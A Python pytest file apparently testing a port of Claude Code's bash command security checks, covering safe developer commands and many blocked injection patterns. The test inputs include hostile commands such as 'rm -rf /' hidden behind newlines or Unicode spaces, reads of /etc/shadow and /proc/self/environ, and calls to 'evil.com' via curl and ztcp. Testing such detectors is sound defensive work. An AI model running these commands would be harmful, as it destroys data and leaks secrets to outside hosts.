"""Tests for equipa.bash_security — ported exploit-pattern detectors.

Tests cover all 20 detector functions (23+ check IDs) from Claude Code's
bashSecurity.ts, including safe commands that should NOT be blocked.

Copyright 2026 Forgeborn. All rights reserved.
"""

import pytest
from equipa.bash_security import (
    BashSecurityResult,
    CheckID,
    check_bash_command,
)


class TestSafeCommands:
    """Verify common dev commands pass without false positives."""

    @pytest.mark.parametrize("cmd", [
        "ls -la",
        "git status",
        "git add file.py && git commit -m 'feat: add thing'",
        "python3 /srv/app/main.py",
        "pytest tests/ -v",
        "npm run build",
        "go build ./...",
        "cat README.md",
        "echo 'hello world'",
        "cd /srv/project && ls",
        "mkdir -p /tmp/test",
        "cp file1.py file2.py",
        "rm -f /tmp/test.log",
        "grep -r 'pattern' src/",
        "docker ps",
        "curl https://example.com",
        "pip install requests",
        "git log --oneline -5",
        "git diff HEAD -- file.py",
        "wc -l *.py",
        "sort output.txt",
        "head -20 large_file.txt",
        "tail -f /var/log/app.log",
        "python3 -m pytest tests/",
        "chmod 755 script.sh",
        "tar czf archive.tar.gz dir/",
        "unzip file.zip -d /tmp/out",
        "find . -name '*.py' -type f",
    ])
    def test_safe_commands_pass(self, cmd: str) -> None:
        result = check_bash_command(cmd)
        assert result.safe, f"False positive on safe command: {cmd!r} — {result.message}"

    def test_empty_command_is_safe(self) -> None:
        result = check_bash_command("")
        assert result.safe

    def test_whitespace_only_is_safe(self) -> None:
        result = check_bash_command("   ")
        assert result.safe


class TestIncompleteCommands:
    """Check ID 1: Incomplete command fragments."""

    def test_trailing_pipe(self) -> None:
        result = check_bash_command("cat file.txt |")
        assert not result.safe
        assert result.check_id == CheckID.INCOMPLETE_COMMANDS

    def test_trailing_semicolon(self) -> None:
        result = check_bash_command("echo hello;")
        assert not result.safe
        assert result.check_id == CheckID.INCOMPLETE_COMMANDS

    def test_trailing_ampersand(self) -> None:
        result = check_bash_command("echo hello &&")
        assert not result.safe
        assert result.check_id == CheckID.INCOMPLETE_COMMANDS


class TestJqExploits:
    """Check IDs 2-3: jq system() and dangerous file flags."""

    def test_jq_system_function(self) -> None:
        result = check_bash_command("jq 'system(\"id\")'")
        assert not result.safe
        assert result.check_id == CheckID.JQ_SYSTEM_FUNCTION

    def test_jq_at_base64d(self) -> None:
        result = check_bash_command("jq '.data | @base64d'")
        assert not result.safe
        assert result.check_id == CheckID.JQ_FILE_ARGUMENTS

    def test_jq_input_flag(self) -> None:
        result = check_bash_command("jq --rawfile var /etc/passwd .")
        assert not result.safe
        assert result.check_id == CheckID.JQ_FILE_ARGUMENTS

    def test_jq_safe_usage(self) -> None:
        result = check_bash_command("jq '.name' package.json")
        assert result.safe


class TestObfuscatedFlags:
    """Check ID 4: ANSI-C quoting, locale quoting, empty quotes in flags."""

    def test_ansi_c_quoting(self) -> None:
        result = check_bash_command("ls $'\\x2d-help'")
        assert not result.safe
        assert result.check_id == CheckID.OBFUSCATED_FLAGS

    def test_locale_quoting(self) -> None:
        result = check_bash_command('cmd $"-flag"')
        assert not result.safe
        assert result.check_id == CheckID.OBFUSCATED_FLAGS

    def test_empty_quotes_in_flag(self) -> None:
        result = check_bash_command("ls -''la")
        assert not result.safe
        assert result.check_id == CheckID.OBFUSCATED_FLAGS

    def test_empty_double_quotes_in_flag(self) -> None:
        result = check_bash_command('ls -""la')
        assert not result.safe
        assert result.check_id == CheckID.OBFUSCATED_FLAGS

    def test_backslash_in_flag(self) -> None:
        # Backslash-escaped chars in shell flags use ANSI-C quoting
        result = check_bash_command("ls $'\\x2d\\x6ca'")
        assert not result.safe
        assert result.check_id == CheckID.OBFUSCATED_FLAGS

    def test_unicode_escape_in_flag(self) -> None:
        result = check_bash_command("cmd $'\\u002d-flag'")
        assert not result.safe
        assert result.check_id == CheckID.OBFUSCATED_FLAGS


class TestCommandSubstitution:
    """Check ID 8: $(), ``, <(), >(), ${}, etc."""

    def test_dollar_paren(self) -> None:
        result = check_bash_command("echo $(whoami)")
        assert not result.safe
        assert result.check_id == CheckID.COMMAND_SUBSTITUTION

    def test_backtick(self) -> None:
        result = check_bash_command("echo `id`")
        assert not result.safe
        assert result.check_id == CheckID.COMMAND_SUBSTITUTION

    def test_process_substitution_in(self) -> None:
        result = check_bash_command("diff <(cmd1) <(cmd2)")
        assert not result.safe
        assert result.check_id == CheckID.COMMAND_SUBSTITUTION

    def test_process_substitution_out(self) -> None:
        result = check_bash_command("tee >(cmd) file")
        assert not result.safe
        assert result.check_id == CheckID.COMMAND_SUBSTITUTION

    def test_dollar_brace(self) -> None:
        result = check_bash_command("echo ${PATH}")
        assert not result.safe
        assert result.check_id == CheckID.COMMAND_SUBSTITUTION


class TestRedirection:
    """Check IDs 9-10: Input/output redirection."""

    def test_input_redirect(self) -> None:
        result = check_bash_command("cmd < /etc/passwd")
        assert not result.safe
        assert result.check_id == CheckID.INPUT_REDIRECTION

    def test_output_redirect(self) -> None:
        result = check_bash_command("cmd > /tmp/out.txt")
        assert not result.safe
        assert result.check_id == CheckID.OUTPUT_REDIRECTION

    def test_append_redirect(self) -> None:
        result = check_bash_command("cmd >> /tmp/out.txt")
        assert not result.safe
        assert result.check_id == CheckID.OUTPUT_REDIRECTION


class TestDangerousVariables:
    """Check ID 6: Variables in redirect/pipe context."""

    def test_dollar_var_in_pipe(self) -> None:
        result = check_bash_command("echo $HOME | cat")
        assert not result.safe
        assert result.check_id == CheckID.DANGEROUS_VARIABLES

    def test_dollar_var_with_redirect(self) -> None:
        result = check_bash_command("echo $PATH > file.txt")
        assert not result.safe
        # Could be 6 or 10 depending on which check fires first


class TestNewlines:
    """Check ID 7: Newlines / carriage return parser differentials."""

    def test_literal_newline(self) -> None:
        result = check_bash_command("echo hello\nrm -rf /")
        assert not result.safe
        assert result.check_id == CheckID.NEWLINES

    def test_carriage_return(self) -> None:
        result = check_bash_command("echo hello\rrm -rf /")
        assert not result.safe
        assert result.check_id == CheckID.NEWLINES


class TestIFSInjection:
    """Check ID 11: $IFS / ${IFS} injection."""

    def test_ifs_variable(self) -> None:
        result = check_bash_command("cat$IFS/etc/passwd")
        assert not result.safe
        assert result.check_id == CheckID.IFS_INJECTION

    def test_ifs_braced(self) -> None:
        result = check_bash_command("cat${IFS}/etc/passwd")
        assert not result.safe
        assert result.check_id == CheckID.IFS_INJECTION


class TestProcEnviron:
    """Check ID 13: /proc/*/environ access."""

    def test_proc_self_environ(self) -> None:
        result = check_bash_command("cat /proc/self/environ")
        assert not result.safe
        assert result.check_id == CheckID.PROC_ENVIRON_ACCESS

    def test_proc_pid_environ(self) -> None:
        result = check_bash_command("cat /proc/1/environ")
        assert not result.safe
        assert result.check_id == CheckID.PROC_ENVIRON_ACCESS


class TestBackslashEscapedWhitespace:
    """Check ID 15: Backslash-escaped whitespace in arguments."""

    def test_backslash_space(self) -> None:
        result = check_bash_command("ls\\ -la")
        assert not result.safe
        assert result.check_id == CheckID.BACKSLASH_ESCAPED_WHITESPACE


class TestBraceExpansion:
    """Check ID 16: Brace expansion {a,b} and {1..5}."""

    def test_comma_brace(self) -> None:
        result = check_bash_command("echo {a,b,c}")
        assert not result.safe
        assert result.check_id == CheckID.BRACE_EXPANSION

    def test_range_brace(self) -> None:
        result = check_bash_command("echo {1..10}")
        assert not result.safe
        assert result.check_id == CheckID.BRACE_EXPANSION

    def test_brace_in_single_quotes_is_safe(self) -> None:
        """Braces inside single quotes should NOT trigger."""
        result = check_bash_command("echo '{a,b}'")
        assert result.safe, f"False positive: brace in single quotes — {result.message}"

    def test_brace_in_double_quotes_is_safe(self) -> None:
        """Braces inside double quotes should NOT trigger."""
        result = check_bash_command('echo "{a,b}"')
        assert result.safe, f"False positive: brace in double quotes — {result.message}"


class TestControlCharacters:
    """Check ID 17: ASCII control characters."""

    def test_null_byte(self) -> None:
        result = check_bash_command("echo hello\x00world")
        assert not result.safe
        assert result.check_id == CheckID.CONTROL_CHARACTERS

    def test_bell_character(self) -> None:
        result = check_bash_command("echo hello\x07world")
        assert not result.safe
        assert result.check_id == CheckID.CONTROL_CHARACTERS

    def test_tab_is_safe(self) -> None:
        """Tab is a control char but should be allowed."""
        result = check_bash_command("echo hello\tworld")
        assert result.safe


class TestUnicodeWhitespace:
    """Check ID 18: Unicode whitespace characters."""

    def test_zero_width_space(self) -> None:
        result = check_bash_command("echo\u200bhello")
        assert not result.safe
        assert result.check_id == CheckID.UNICODE_WHITESPACE

    def test_zero_width_joiner(self) -> None:
        result = check_bash_command("cmd\u200dhello")
        assert not result.safe
        assert result.check_id == CheckID.UNICODE_WHITESPACE

    def test_em_space(self) -> None:
        result = check_bash_command("echo\u2003hello")
        assert not result.safe
        assert result.check_id == CheckID.UNICODE_WHITESPACE


class TestHeredocInSubstitution:
    """Check ID 19: Heredoc inside command substitution."""

    def test_heredoc_in_dollar_paren(self) -> None:
        result = check_bash_command("$(cat <<EOF\nhello\nEOF\n)")
        assert not result.safe
        assert result.check_id == CheckID.HEREDOC_IN_SUBSTITUTION


class TestBackslashEscapedOperators:
    """Check ID 21: Backslash-escaped shell operators."""

    def test_escaped_pipe(self) -> None:
        result = check_bash_command("cmd \\| other")
        assert not result.safe
        assert result.check_id == CheckID.BACKSLASH_ESCAPED_OPERATORS

    def test_escaped_ampersand(self) -> None:
        result = check_bash_command("cmd \\& other")
        assert not result.safe
        assert result.check_id == CheckID.BACKSLASH_ESCAPED_OPERATORS

    def test_escaped_semicolon(self) -> None:
        result = check_bash_command("cmd \\; other")
        assert not result.safe
        assert result.check_id == CheckID.BACKSLASH_ESCAPED_OPERATORS


class TestQuotedNewline:
    """Check ID 23: Quoted newline + # comment hiding."""

    def test_quoted_newline_hash(self) -> None:
        result = check_bash_command('echo "hello\n# rm -rf /"')
        assert not result.safe
        assert result.check_id == CheckID.QUOTED_NEWLINE


class TestResultDataclass:
    """Verify BashSecurityResult has correct fields."""

    def test_safe_result_fields(self) -> None:
        result = check_bash_command("ls")
        assert result.safe is True
        assert result.check_id == 0
        assert result.message == ""

    def test_blocked_result_fields(self) -> None:
        result = check_bash_command("echo $(id)")
        assert result.safe is False
        assert result.check_id == CheckID.COMMAND_SUBSTITUTION
        assert "command substitution" in result.message.lower()


class TestMultipleViolations:
    """Commands with multiple violations should catch the first one."""

    def test_first_violation_wins(self) -> None:
        # This has both newline (7) and command substitution (8)
        result = check_bash_command("echo\n$(id)")
        assert not result.safe
        # Check 7 (newlines) should fire before check 8


class TestRealWorldExploits:
    """Real-world exploit patterns from Claude Code's test suite."""

    def test_jq_base64d_exfil(self) -> None:
        result = check_bash_command(
            "echo '{\"key\":\"value\"}' | jq -r '.key | @base64d'"
        )
        assert not result.safe

    def test_ifs_cat_etc_passwd(self) -> None:
        result = check_bash_command("cat${IFS}/etc/shadow")
        assert not result.safe

    def test_proc_environ_exfil(self) -> None:
        result = check_bash_command("strings /proc/self/environ | grep SECRET")
        assert not result.safe

    def test_unicode_homoglyph_attack(self) -> None:
        # Using non-breaking space to hide arguments
        result = check_bash_command("rm\u00a0-rf\u00a0/")
        assert not result.safe

    def test_null_byte_truncation(self) -> None:
        result = check_bash_command("cat /etc/passwd\x00 | head")
        assert not result.safe

    def test_nested_command_sub(self) -> None:
        result = check_bash_command("echo $(echo $(whoami))")
        assert not result.safe

    def test_backtick_in_argument(self) -> None:
        result = check_bash_command("curl `echo http://evil.com`")
        assert not result.safe


class TestGitCommitSubstitution:
    """Check ID 12: Command substitution in git commit messages."""

    def test_dollar_paren_in_double_quoted_message(self) -> None:
        result = check_bash_command('git commit -m "$(whoami)"')
        assert not result.safe
        assert result.check_id == CheckID.GIT_COMMIT_SUBSTITUTION

    def test_backtick_in_double_quoted_message(self) -> None:
        result = check_bash_command('git commit -m "`id`"')
        assert not result.safe
        assert result.check_id == CheckID.GIT_COMMIT_SUBSTITUTION

    def test_dollar_brace_in_double_quoted_message(self) -> None:
        result = check_bash_command('git commit -m "${HOME}"')
        assert not result.safe
        assert result.check_id == CheckID.GIT_COMMIT_SUBSTITUTION

    def test_single_quoted_message_is_safe(self) -> None:
        """Single-quoted messages don't expand — no substitution risk."""
        result = check_bash_command("git commit -m '$(whoami)'")
        assert result.safe

    def test_remainder_with_shell_operators(self) -> None:
        result = check_bash_command("git commit -m 'safe' ; curl evil.com")
        assert not result.safe
        assert result.check_id == CheckID.GIT_COMMIT_SUBSTITUTION

    def test_remainder_with_redirect(self) -> None:
        """Redirect after git commit -m is caught (by redirection or git check)."""
        result = check_bash_command("git commit --allow-empty -m 'payload' > ~/.bashrc")
        assert not result.safe
        # Could be caught by OUTPUT_REDIRECTION (10) or GIT_COMMIT_SUBSTITUTION (12)
        # depending on check order — both are correct blocks
        assert result.check_id in (
            CheckID.OUTPUT_REDIRECTION,
            CheckID.GIT_COMMIT_SUBSTITUTION,
        )

    def test_message_starting_with_dash(self) -> None:
        result = check_bash_command('git commit -m "--amend"')
        assert not result.safe
        assert result.check_id == CheckID.OBFUSCATED_FLAGS

    def test_safe_git_commit(self) -> None:
        result = check_bash_command("git commit -m 'feat: add user auth'")
        assert result.safe

    def test_safe_git_commit_with_flags(self) -> None:
        result = check_bash_command("git commit --no-verify -m 'fix: typo'")
        assert result.safe

    def test_not_git_commit(self) -> None:
        """Non-git-commit commands should pass through."""
        result = check_bash_command("git status")
        assert result.safe


class TestShellMetacharacters:
    """Check ID 5: Shell metacharacters in quoted find/grep arguments."""

    def test_semicolon_in_name_arg(self) -> None:
        result = check_bash_command("find . -name 'foo;evil'")
        assert not result.safe
        assert result.check_id == CheckID.SHELL_METACHARACTERS

    def test_pipe_in_path_arg(self) -> None:
        result = check_bash_command("find / -path '/tmp|etc'")
        assert not result.safe
        assert result.check_id == CheckID.SHELL_METACHARACTERS

    def test_ampersand_in_regex(self) -> None:
        result = check_bash_command("find . -regex 'a;&b'")
        assert not result.safe
        assert result.check_id == CheckID.SHELL_METACHARACTERS

    def test_safe_name_pattern(self) -> None:
        result = check_bash_command("find . -name '*.py' -type f")
        assert result.safe


class TestMidWordHash:
    """Check ID 19 (alt): Mid-word # parser differential."""

    def test_mid_word_hash(self) -> None:
        # foo# — # not preceded by whitespace
        result = check_bash_command("echo foo#bar")
        assert not result.safe
        assert result.check_id == CheckID.MID_WORD_HASH

    def test_hash_at_word_start_is_safe(self) -> None:
        # # at start of command is a comment, not mid-word
        # But the command starts with #, which means the entire line is a comment.
        # Our check only fires on \S# (non-whitespace before #).
        result = check_bash_command("echo test # this is a comment")
        assert result.safe

    def test_dollar_brace_hash_is_safe(self) -> None:
        """${#var} is bash string-length syntax, not mid-word hash."""
        # This will be caught by command substitution first
        result = check_bash_command("echo ${#PATH}")
        assert not result.safe
        assert result.check_id == CheckID.COMMAND_SUBSTITUTION

    def test_quote_adjacent_hash(self) -> None:
        # 'x'# — hash immediately after closing quote
        result = check_bash_command("echo 'x'#bar")
        assert not result.safe


class TestZshDangerousCommands:
    """Check ID 20: Zsh-specific dangerous commands."""

    def test_zmodload(self) -> None:
        result = check_bash_command("zmodload zsh/system")
        assert not result.safe
        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS
        assert "zmodload" in result.message

    def test_emulate(self) -> None:
        result = check_bash_command("emulate sh -c 'evil'")
        assert not result.safe
        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS

    def test_syswrite(self) -> None:
        result = check_bash_command("syswrite -o 1 payload")
        assert not result.safe
        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS

    def test_ztcp(self) -> None:
        result = check_bash_command("ztcp evil.com 4444")
        assert not result.safe
        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS

    def test_zpty(self) -> None:
        result = check_bash_command("zpty mypty bash -c 'id'")
        assert not result.safe
        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS

    def test_zf_rm(self) -> None:
        result = check_bash_command("zf_rm -rf /")
        assert not result.safe
        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS

    def test_fc_minus_e(self) -> None:
        result = check_bash_command("fc -e vim")
        assert not result.safe
        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS
        assert "fc -e" in result.message

    def test_fc_without_e_is_safe(self) -> None:
        """Plain fc (list history) should not be blocked."""
        result = check_bash_command("fc -l")
        assert result.safe

    def test_precommand_modifier_bypass(self) -> None:
        """Zsh precommand modifiers should be stripped before matching."""
        result = check_bash_command("builtin zmodload zsh/files")
        assert not result.safe
        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS

    def test_env_var_prefix_bypass(self) -> None:
        """VAR=val prefix should be stripped before matching."""
        result = check_bash_command("FOO=bar command zmodload zsh/system")
        assert not result.safe
        assert result.check_id == CheckID.ZSH_DANGEROUS_COMMANDS


class TestCommentQuoteDesync:
    """Check ID 22: Quote characters inside # comments desync quote tracking."""

    def test_quote_in_comment(self) -> None:
        result = check_bash_command("echo hello # it's a test")
        assert not result.safe
        assert result.check_id == CheckID.COMMENT_QUOTE_DESYNC
        assert "comment" in result.message.lower()

    def test_double_quote_in_comment(self) -> None:
        result = check_bash_command('echo hello # say "hi"')
        assert not result.safe
        assert result.check_id == CheckID.COMMENT_QUOTE_DESYNC

    def test_comment_without_quotes_is_safe(self) -> None:
        """Comments without quote chars should be fine."""
        result = check_bash_command("echo hello # safe comment")
        assert result.safe

    def test_hash_inside_quotes_is_not_comment(self) -> None:
        """# inside quotes is not a comment — should not trigger desync check."""
        result = check_bash_command("echo 'hello # not a comment'")
        assert result.safe

    def test_hash_inside_double_quotes_is_not_comment(self) -> None:
        """# inside double quotes is not a comment."""
        result = check_bash_command('echo "hello # not a comment"')
        assert result.safe
